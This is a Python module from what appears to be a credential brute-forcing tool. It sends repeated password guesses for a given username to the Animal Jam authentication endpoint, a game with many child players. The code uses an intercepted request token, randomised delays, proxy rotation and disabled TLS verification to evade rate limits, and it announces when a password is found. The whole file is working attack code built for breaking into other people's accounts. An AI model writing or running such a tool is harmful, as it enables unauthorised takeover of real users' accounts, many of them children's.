import time
import random
import requests
from colorama import Fore
from src.workercontrol import Threading 
from src.cli import parse_arguments

class LoginRequests:
    
   
    def __init__(self):
         args = parse_arguments()
         self.username = args.username
         self.uri = "https://authenticator.animaljam.com/authenticate" 
         self.threading = Threading()
         self.print_lock = self.threading.print_lock
         self.repeated_lock = self.threading.repeated_lock
         self.pause_event = self.threading.pause_event
         

    def send_login(self, password, proxy = None) -> None:
        if not proxy:
            time.sleep(random.uniform(1.5, 4.7)) 
        else:
            time.sleep(random.uniform(1,3.5)) 
        # intercepted login endpoint payload
        payload = { 
        "username": self.username, 
        "password": password, 
        "domain": "flash", 
        "df": "8aebf98697464e47fd10b2e0849b3a105597f2599b03c4f8af6bcdc3dda40eca" # intercepted df value. This can stay the same for all requests.
        } 

        
        max_retries = 3
        for attempt in range(max_retries):
            while self.pause_event.is_set():
                self.pause_event.wait(timeout=0.1)
            proxies = {"http": proxy, "https": proxy} if proxy else None
            try: # send requests 
                response = requests.post(self.uri, json=payload, proxies=proxies, timeout=2.0, verify=False)
                with self.print_lock:
                    print(Fore.BLUE + f'Trying password: "{password}" response code: {response.status_code}')

            
                if response.status_code == 200: 
                    with self.print_lock:
                        print(Fore.GREEN + f'Found password: {password}')
                        print(response.text[:500])
                    input()
                elif response.status_code == 401:
                    print(Fore.RED + f'Invalid username or password')
                    return
                elif response.status_code == 502:
                    
                    with self.repeated_lock:
                        self.threading.repeated_502 += 1
                    self.threading.pause_workers()
                    with self.print_lock:
                        print(Fore.RED + f"Server Overload - waiting a few seconds... (repeated {self.threading.repeated_502} times)")
                    
                      
                    continue
                return
                
            except Exception as e: 
                if attempt < max_retries - 1:
                    continue
                elif attempt == max_retries - 1 and proxy:
                    proxy = None
                    continue
                else:
                    with self.print_lock:
                        print(Fore.RED + f'Error with password "{password}": {e}')